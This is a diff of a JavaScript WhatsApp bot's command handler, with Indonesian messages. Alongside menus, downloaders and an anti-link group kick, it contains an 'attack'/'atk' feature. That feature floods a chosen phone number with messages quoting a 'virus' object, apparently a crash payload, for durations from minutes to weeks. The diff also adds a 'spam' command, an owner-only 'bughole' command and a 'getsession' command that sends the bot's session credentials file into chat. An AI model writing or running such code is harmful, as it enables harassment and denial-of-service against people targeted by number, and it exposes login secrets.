@@ -51,7 +51,7 @@ let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
 let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
 let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
 let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
-
+let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
 // Tanggal
 var dt = new Date 
 const date = dt.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' }) 
@@ -62,6 +62,7 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 	try {
 		let { ownerNumber, botName, gamewaktu, limitCount, packname, author } = setting
 		let { allmenu } = require('./help')
+		let { bughole } = require('./bughole')
 		const { type, quotedMsg, mentioned, now, fromMe } = msg
 		if (msg.isBaileys) return
 		const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
@@ -72,7 +73,7 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 		const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
                 const toJSON = j => JSON.stringify(j, null,'\t')
 		if (conn.multi) {
-			var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\^]/gi) : '#'
+			var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\^]/gi) : ''
 		} else {
 			if (conn.nopref) {
 				prefix = ''
@@ -100,10 +101,11 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 		const isUser = pendaftar.includes(sender)
 		const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
         const isWelcome = isGroup ? welcome.includes(from) ? true : false : false
-        const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: {title: setting.author, jpegThumbnail: setting.thumb, thumbnailUrl: setting.group } } }
+        const isAntilink = isGroup ? antilink.includes(from) ? true : false : false
+        const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: {title: setting.footext, jpegThumbnail: setting.thumb, thumbnailUrl: setting.group } } }
 		const gcounti = setting.gcount
 		const gcount = isPremium ? gcounti.prem : gcounti.user
-        const ftoko = {key:{fromMe:false, participant:`0@s.whatsapp.net`, ...(from? {remoteJid:"0@s.whatsapp.net"}:{}) }, message:{ "productMessage":{ "product":{ "productImage":{ "mimetype":"image/jpeg", "jpegthumbnail": setting.pathimg }, "title": setting.author, "description": ucapanWaktu, "currencyCode":"IDR", "priceAmount1000":"20000000", "retailerId":"Ghost", "productImageCount":1 }, "businessOwnerJid":`6281316702752@s.whatsapp.net` } } }
+        const ftoko = {key:{fromMe:false, participant:`0@s.whatsapp.net`, ...(from? {remoteJid:"0@s.whatsapp.net"}:{}) }, message:{ "productMessage":{ "product":{ "productImage":{ "mimetype":"image/jpeg", "jpegthumbnail": setting.pathimg }, "title": setting.footext, "description": ucapanWaktu, "currencyCode":"IDR", "priceAmount1000":"20000000", "retailerId":"Ghost", "productImageCount":1 }, "businessOwnerJid":`6281316702752@s.whatsapp.net` } } }
 		const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
                 const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
                 const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
@@ -193,10 +195,10 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
                    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
                 }
 		const reply = (teks) => {
-			conn.sendMessage(from, { text: teks }, { quoted: msg })
+			conn.sendMessage(from, { text: teks , contextInfo:{"externalAdReply": {"title": `Haik Onichan`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: { key: {fromMe: false, participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { contactMessage: { displayName: jam + ' WIB', vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + `item1.TEL;waid=${sender.split("@")[0]}:+${sender.split("@")[0]}\n` + 'item1.X-ABLabel:Ponsel\n' + 'END:VCARD' }}} })
 		}
 		const textImg = (teks) => {
-			return conn.sendMessage(from, { text: teks, jpegThumbnail: fs.readFileSync(setting.pathimg) }, { quoted: msg })
+			return conn.sendMessage(from, { text: teks, jpegThumbnail: { url : setting.pathimg } }, { quoted: msg })
 		}
 		const sendMess = (hehe, teks) => {
 			conn.sendMessage(hehe, { text, teks })
@@ -247,12 +249,27 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 
 		// Auto Bio?
 		if (new Date() * 1 ) {
-		await conn.setStatus(`🎉 Ultah Owner : ${ultah} | ⏳ Runtime : ${runtime(process.uptime())} | 💬 Prefix : ${conn.prefix ? 'Multi' : 'NoPrefix'}`)
+		await conn.setStatus(`🎉 Ultah Owner : ${ultah} | ⏳ Runtime : ${runtime(process.uptime())} | 💬 Prefix : Multi`)
 	    }
          
+         if (isAntilink && isGroup) {
+        if (body.match(`chat.whatsapp.com`)) {
+        reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
+        if (isBotGroupAdmins) return reply(`Ehh bot gak admin T_T`)
+        let gclink = (`https://chat.whatsapp.com/`+ await conn.groupInviteCode(from))
+        let isLinkThisGc = new RegExp(gclink, 'i')
+        let isgclink = isLinkThisGc.test(body)
+        if (isgclink) return reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
+        if (isGroupAdmins) return reply(`Ehh maaf kamu admin`)
+        if (isOwner) return reply(`Ehh maaf kamu owner bot ku`)
+        await conn.groupParticipantsUpdate(from, [sender], 'remove')
+        }
+        }
+        
 		// Auto Registrasi
 		if (isCmd && !isUser) {
 		  pendaftar.push(sender)
+		  reply(`Hai kak @${pushname}, Kamu Belum terdeteksi di database bot, ketik *.menu* untuk melihat list menu, Selamat Menggunakan ${botname}`)
 		  fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
 		}
 		
@@ -526,34 +543,30 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
             reply(`${nilai_one / nilai_two}`)
             break
             // Main Menu
+            case prefix+'test':
+            let td = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
+            var message = {
+            document: { url: setting.pathimg },
+            jpegThumbnail: { url : setting.pathimg }, fileName: setting.footext, mimetype: td, fileLength: '9999999', pageCount: '999',
+            caption: "BOT ONLINE\n\nOKE DONE DESU",
+            footer: setting.footext,
+            templateButtons: buttonsDefault
+        }
+        conn.sendMessage(from, message)
+           break
 			case prefix+'menu':
 			case prefix+'help':
 			    addCountCmd('#help', sender, _cmd)
-			var listMsg = {
-                text: `${ucapanWaktu} @${sender.split("@")[0]}`,
-                buttonText: 'Click Here!',
-                footer: `Kamu Pengguna Wa Original?`,
-                mentions: [sender],
-                sections: [{
-                    title: "PILIH SALAH SATU YA", rows: [
-                    {title: "IYA, AKU PENGGUNA WHATSAPP ORIGINAL",
-                    rowId: `${prefix}menun`
-                    },{
-                    title: "TIDAK, AKU PENGGUNA WHATSAPP GB",
-                    rowId: `${prefix}menud`
-                    },
-                    ]
-                }]
-            }
-            conn.sendMessage(from, listMsg)
-            break
-             case prefix+'menud':
              var teks = allmenu(sender, prefix, pushname, isOwner, isPremium, balance, limit, limitCount, glimit, gcount)
-			    conn.send5ButImg(from , teks, ` ${setting.author}`, fs.readFileSync('./media/thumb.jpeg'), buttonsDefault, msg)
+             var thuju = { url : setting.pathimg }
+			var tol = conn.send5ButLoc(from , teks, ` ${setting.footext}`, thuju, buttonsDefault, msg)
+			await sleep(500)
+			conn.sendMessage(from, { audio: { url: './media/yy.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted : tol})
 			break
-			case prefix+'menun':
-			var teks = allmenu(sender, prefix, pushname, isOwner, isPremium, balance, limit, limitCount, glimit, gcount)
-			   conn.sendMessage(from, {image : fs.readFileSync(setting.pathimg), caption: teks}, { quoted : fdoc })
+			case prefix+'getsession':
+			case prefix+'sendsession':
+			var sesi = fs.readFileSync('session.json')
+			conn.sendMessage(from, {document : sesi, mimetype: 'application/json', fileName: 'session.json' }, m)
 				break
             case prefix+'menfess':
             case prefix+'kirim':
@@ -568,7 +581,7 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 				   image: fs.readFileSync('./media/menfess.jpeg'),
 				   caption: `Pesan Dari ${senderz}\n\n*_TANGGAL_*: ${date}\n\n*_JAM_*     : ${jam}\n\n*_PESAN_* : ${mess}`,
 				   buttons: [{buttonId: `${prefix}markread ${from}`, buttonText: { displayText: "Tandai Telah Di Baca" }, type: 1 }],
-				   footer: ` ${setting.author}`
+				   footer: ` ${setting.footext}`
 			      }, { quoted: msg })
 			reply(`sukses mengirim pesan ke ${tujuan}`)
             limitAdd(sender, limit)
@@ -579,7 +592,7 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 				   image: fs.readFileSync('./media/menfess.jpeg'),
 				   caption: `${sender.split('@')[0]} Telah Membaca Pesan Mu\n\n*_TANGGAL_*: ${date}\n\n*_JAM_*: ${jam}`,
 				   buttons: [{buttonId: `mmk`, buttonText: { displayText: "Ok" }, type: 1 }],
-				   footer: ` ${setting.author}`
+				   footer: ` ${setting.footext}`
 			      }, { quoted: msg })
             break
 			case prefix+'runtime':
@@ -2173,7 +2186,7 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 				   video: { url: fatih.result.download.no_wm },
 				   caption: `${fatih.result.title}\n\nKamu bisa mengubahnya menjadi Vidio Tanpa Watermark atau Audio, tekan tombol dibawah untuk mengubahnya!`,
 				   buttons: [{buttonId: `${prefix}tiktokaudio ${args[1]}`, buttonText: { displayText: "Audio" }, type: 1 }],
-				   footer: ` ${setting.author}`
+				   footer: ` ${setting.footext}`
 			      }, { quoted: msg })
 				  limitAdd(sender, limit)
 			    .catch(() => reply("Maaf terjadi kesalahan"))
@@ -2185,8 +2198,8 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 			    if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
 			    addCountCmd('#tiktoknowm', sender, _cmd)
 			    reply("Wait..")
-			    var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/dowloader/tikok?url=${args[1]}`)
-			      conn.sendMessage(from, { video: { url: riy.result.video }}, { quoted: msg })
+			    var riy = await fetchJson(`https://fatiharridho.herokuapp.com/api/downloader/tiktok?url=${args[1]}`)
+			      conn.sendMessage(from, { video: { url: fatih.result.download.no_wm }}, { quoted: msg })
 			      limitAdd(sender, limit)
 			    break
 			case prefix+'tiktokaudio':
@@ -2196,8 +2209,8 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 			    if (!args[1].includes('tiktok')) return reply(mess.error.Iv)
 			    addCountCmd('#tiktokaudio', sender, _cmd)
 			    reply("_Wait a minute, data is being processed!_")
-			    var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/dowloader/tikok?url=${args[1]}`)
-			      conn.sendMessage(from, { audio: { url: riy.result.audio }, mimetype: 'audio/mp4' }, { quoted: msg })
+			    var riy = await fetchJson(`https://fatiharridho.herokuapp.com/api/downloader/tiktok?url=${args[1]}`)
+			      conn.sendMessage(from, { audio: { url: fatih.result.download.audio }, mimetype: 'audio/mp4' }, { quoted: msg })
 			       limitAdd(sender, limit)
 		        break
             case prefix+'play':
@@ -2339,7 +2352,7 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 				   image: {url : "https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=BROADCAST"},
 				   caption: `*_BROADCAST_*\n\n ${q}`,
 				   buttons: [{buttonId: `${prefix}menu`, buttonText: { displayText: "Menu" }, type: 1 }],
-				   footer: ` ${setting.author}`
+				   footer: ` ${setting.footext}`
 			      }, { quoted: ftoko })
                                await sleep(1000)
                             }
@@ -2602,85 +2615,85 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 				}).catch(() => reply("Maaf terjadi kesalahan"))
 				break
             case prefix+'attack':
-	    if (!isOwner && !isPremium) return reply(`Fitur hanya dapat di gunakan oleh user premium`)
-	    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
-        if (args.length < 2) return reply(`Mau Attack Siapa?`)
-let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
-let noget = nomore.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
-if (isNaN(noget)) return reply(`Must be a number Bitch!! `)
-var satgnz = "6281316701742"
-let isnoown = new RegExp(satgnz, 'i')
-let isOwn = isnoown.test(m.text)
- if (isOwn) return m.reply(`You Can't ${command} My Owner Bitch!`)
- {
- 	var listMsg = {
+	        if (!isOwner && !isPremium) return reply(`Fitur hanya dapat di gunakan oleh user premium`)
+	        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+            if (args.length < 2) return reply(`Mau Attack Siapa?`)
+            let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
+            let noget = nomore.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
+            if (isNaN(noget)) return reply(`Must be a number Bitch!! `)
+            var satgnz = "6281316701742"
+            let isnoown = new RegExp(satgnz, 'i')
+            let isOwn = isnoown.test(m.text)
+            if (isOwn) return m.reply(`You Can't ${command} My Owner Bitch!`)
+            {
+        	var listMsg = {
                 text: `${ucapanWaktu} @${sender.split("@")[0]}, \n\nSilahkan Pilih Durasi Penyerangan`,
                 buttonText: 'Click Here!',
                 footer: `© Kurniawan Satria`,
                 mentions: [sender],
                 sections: [
                 {
-title: "MINUTE SELECTION",
+            title: "MINUTE SELECTION",
                 rows: [
-{title: "1 Minute", rowId: `${prefix}atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
-{title: "2 Minute", rowId: `${prefix}atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
-{title: "3 Minute", rowId: `${prefix}atk ${noget}|3`, description: `Attack ${noget} During 3 Minute`},
-{title: "4 Minute", rowId: `${prefix}atk ${noget}|4`, description: `Attack ${noget} During 4 Minute`},
-{title: "5 Minute", rowId: `${prefix}atk ${noget}|5`, description: `Attack ${noget} During 5 Minute`},
+           {title: "1 Minute", rowId: `${prefix}atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
+           {title: "2 Minute", rowId: `${prefix}atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
+           {title: "3 Minute", rowId: `${prefix}atk ${noget}|3`, description: `Attack ${noget} During 3 Minute`},
+           {title: "4 Minute", rowId: `${prefix}atk ${noget}|4`, description: `Attack ${noget} During 4 Minute`},
+           {title: "5 Minute", rowId: `${prefix}atk ${noget}|5`, description: `Attack ${noget} During 5 Minute`},
                 ]
                 },
                 {
-title: "CLOCK SELECTION",
+           title: "CLOCK SELECTION",
                 rows: [
-{title: "1 Hours", rowId: `${prefix}atk ${noget}|60`, description: `Attack ${noget} During 1 Hours `},
-{title: "2 Hours", rowId: `${prefix}atk ${noget}|120`, description: `Attack ${noget} During 2 Hours `},
-{title: "3 Hours", rowId: `${prefix}atk ${noget}|180`, description: `Attack ${noget} During 3 Hours `},
-{title: "4 Hours", rowId: `${prefix}atk ${noget}|240`, description: `Attack ${noget} During 4 Hours `},
-{title: "5 Hours", rowId: `${prefix}atk ${noget}|300`, description: `Attack ${noget} During 5 Hours `}
+           {title: "1 Hours", rowId: `${prefix}atk ${noget}|60`, description: `Attack ${noget} During 1 Hours `},
+           {title: "2 Hours", rowId: `${prefix}atk ${noget}|120`, description: `Attack ${noget} During 2 Hours `},
+           {title: "3 Hours", rowId: `${prefix}atk ${noget}|180`, description: `Attack ${noget} During 3 Hours `},
+           {title: "4 Hours", rowId: `${prefix}atk ${noget}|240`, description: `Attack ${noget} During 4 Hours `},
+           {title: "5 Hours", rowId: `${prefix}atk ${noget}|300`, description: `Attack ${noget} During 5 Hours `}
                 ]
                 },
                 {
-title: "DAILY SELECTION",
-rows: [
-{title: "1 Day", rowId: `${prefix}atk ${noget}|1440`, description: `Attack ${noget} During 1 Day `},
-{title: "2 Day", rowId: `${prefix}atk ${noget}|2880`, description: `Attack ${noget} During 2 Day `},
-{title: "3 Day", rowId: `${prefix}atk ${noget}|4320`, description: `Attack ${noget} During 3 Day `},
-{title: "4 Day", rowId: `${prefix}atk ${noget}|5760`, description: `Attack ${noget} During 4 Day `},
-{title: "5 Day", rowId: `${prefix}atk ${noget}|7200`, description: `Attack ${noget} During 5 Day `}
-]
-},
-{
-title: "WEEKLY SELECTION",
-rows: [
-{title: "1 Week", rowId: `${prefix}atk ${noget}|10080`, description: `Attack ${noget} During 1 Week `},
-{title: "2 Week", rowId: `${prefix}atk ${noget}|20160`, description: `Attack ${noget} During 2 Week `},
-{title: "3 Week", rowId: `${prefix}atk ${noget}|30240`, description: `Attack ${noget} During 3 Week `},
-{title: "4 Week", rowId: `${prefix}atk ${noget}|40320`, description: `Attack ${noget} During 4 Week `},
-{title: "5 Week", rowId: `${prefix}atk ${noget}|50400`, description: `Attack ${noget} During 5 Week `}
-]
-},
-]
+            title: "DAILY SELECTION",
+            rows: [
+           {title: "1 Day", rowId: `${prefix}atk ${noget}|1440`, description: `Attack ${noget} During 1 Day `},
+           {title: "2 Day", rowId: `${prefix}atk ${noget}|2880`, description: `Attack ${noget} During 2 Day `},
+           {title: "3 Day", rowId: `${prefix}atk ${noget}|4320`, description: `Attack ${noget} During 3 Day `},
+           {title: "4 Day", rowId: `${prefix}atk ${noget}|5760`, description: `Attack ${noget} During 4 Day `},
+           {title: "5 Day", rowId: `${prefix}atk ${noget}|7200`, description: `Attack ${noget} During 5 Day `}
+           ]
+           },
+           {
+            title: "WEEKLY SELECTION",
+             rows: [
+            {title: "1 Week", rowId: `${prefix}atk ${noget}|10080`, description: `Attack ${noget} During 1 Week `},
+            {title: "2 Week", rowId: `${prefix}atk ${noget}|20160`, description: `Attack ${noget} During 2 Week `},
+            {title: "3 Week", rowId: `${prefix}atk ${noget}|30240`, description: `Attack ${noget} During 3 Week `},
+            {title: "4 Week", rowId: `${prefix}atk ${noget}|40320`, description: `Attack ${noget} During 4 Week `},
+            {title: "5 Week", rowId: `${prefix}atk ${noget}|50400`, description: `Attack ${noget} During 5 Week `}
+               ]
+              },
+             ]
             }
-conn.sendMessage(from, listMsg)
-}
-break
-case prefix+'atk':
-if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
-if (args.length < 2) return reply(`Examples of use : ${command} >Target<|*>Amount<*`) 
-let spar = q.split("|")[0]
-let terern = q.split("|")[1]
-var satgnz = "6281316701742"
-let isLinkThisGc = new RegExp(satgnz, 'i')
-let isgclink = isLinkThisGc.test(m.text)
- if (isgclink) return reply(`You Can't Attack My Owner`)
-if (!terern) return reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
-for (let i = 0; i < terern; i++){
-conn.sendMessage(`${spar}@s.whatsapp.net`, { text: "Hi", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(setting.pathimg),"sourceUrl": "hehe"}}}, { quoted: virus})
-}
-let ter = q.split("|")[1]
-reply(`Success Attack Target During Attack ${ter} Minutes`)
-break
-            conn.sendMessage(from, { text: "haii?", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(setting.pathimg),"sourceUrl": "hehe"}}}, { quoted: virus})
+            conn.sendMessage(from, listMsg)
+           }
+            break
+            case prefix+'atk':
+            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+            if (args.length < 2) return reply(`Examples of use : ${command} >Target<|*>Amount<*`) 
+            let spar = q.split("|")[0]
+            let terern = q.split("|")[1]
+            var satgnz = "6281316701742"
+            let isLinkThisGc = new RegExp(satgnz, 'i')
+            let isgclink = isLinkThisGc.test(m.text)
+            if (isgclink) return reply(`You Can't Attack My Owner`)
+            if (!terern) return reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
+            for (let i = 0; i < terern; i++){
+            conn.sendMessage(`${spar}@s.whatsapp.net`, { text: "Hi", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: virus})
+            }
+            let ter = q.split("|")[1]
+            reply(`Success Attack Target During Attack ${ter} Minutes`)
+            break
+            conn.sendMessage(from, { text: "haii?", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: virus})
             break
 			case prefix+'group': case prefix+'grup':
 		        if (!isGroup) return reply(mess.OnlyGrup)
@@ -2764,6 +2777,27 @@ break
                               reply(`Pilih enable atau disable`)
                             }
                             break
+                            case prefix+'antilink':
+                            if (!isGroup) return reply(mess.OnlyGrup)
+                            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
+                            if (args.length < 2) return reply(`Pilih enable atau disable`)
+                            if (args[1].toLowerCase() === "enable") {
+                              if (isAntilink) return reply(`Antilink sudah aktif`)
+                              addCountCmd('#antilink', sender, _cmd)
+                              antilink.push(from)
+                              fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
+                              reply(`Sukses mengaktifkan welcome di grup ini`)
+                            } else if (args[1].toLowerCase() === "disable") {
+                              if (!isAntilink) return reply(`Antilink sudah nonaktif`)
+                              addCountCmd('#antilink', sender, _cmd)
+                              var posi = antilink.indexOf(from)
+                              antilink.splice(posi, 1)
+                              fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
+                              reply(`Sukses menonaktifkan antilink di grup ini`)
+                            } else {
+                              reply(`Pilih enable atau disable`)
+                            }
+                            break
 			// Bank & Payment Menu
 			case prefix+'topbalance':{
 				addCountCmd('#topbalance', sender, _cmd)
@@ -2836,10 +2870,27 @@ break
                     textImg(`Limit : ${isPremium ? 'Unlimited' : limitPrib}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                 }
 				break
+            // Fun menu
+            case prefix+'spam':
+            addCountCmd('#spam', sender, _cmd)
+            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+            if (!q) return reply("Contoh Pengunaan : \n\n.spam sayang|10")
+            let txtz = q.split("|")[0]
+            let count = q.split("|")[1]
+if (isNaN(count)) return reply(`Harus nomor, kocak`)
+if (Number(count) >= 111) throw reply('Kebanyakan')
+for (let i = 0; i < count; i++){
+	reply(txtz)
+	}
+	break
+            case prefix+'bughole':
+            addCountCmd('#bughole', sender, _cmd)
+            if (!isOwner) return reply("Owner Only")
+            let bro = bughole(sender)
+            reply(bro)
+            break
 			default:
-			if (!isGroup && isCmd) {
-				reply(`Command belum tersedia, coba beberapa hari kedepan yaa! _^`)
-			}
+		    
 		}
 	} catch (err) {
 		console.log(color('[ERROR]', 'red'), err)
